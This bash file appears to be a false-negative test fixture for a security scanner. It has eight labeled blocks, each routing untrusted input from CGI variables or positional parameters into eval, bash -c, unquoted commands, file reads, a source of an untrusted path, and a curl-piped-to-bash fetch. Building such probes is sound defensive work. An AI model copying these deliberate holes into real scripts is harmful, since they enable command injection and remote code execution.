#!/bin/bash
# FALSE-NEGATIVE PROBE — every block is a REAL vulnerability via a bash taint
# source (positional params, QUERY_STRING) into a command/path/code sink.
# Any block that produces NO finding is a FALSE NEGATIVE.

# 1. CWE-94 — eval of an untrusted CGI env var
q="$QUERY_STRING"
eval "$q"

# 2. CWE-78 — positional parameter passed to a shell
bash -c "$1"

# 3. CWE-78 — unquoted positional param in a command (word-split/inject)
host=$1
ping -c 3 $host

# 4. CWE-78 — command substitution with user input
result=$(whois $2)
echo "$result"

# 5. CWE-22 — path traversal: unquoted user path read
cat $1

# 6. CWE-94 — remote code execution: curl piped to shell
curl "https://example.com/$1" | bash

# 7. CWE-98 — sourcing an untrusted path
source "$HTTP_CONFIG_PATH"

# 8. CWE-78 — eval of an HTTP-derived REQUEST var
eval "echo ${REQUEST_URI}"
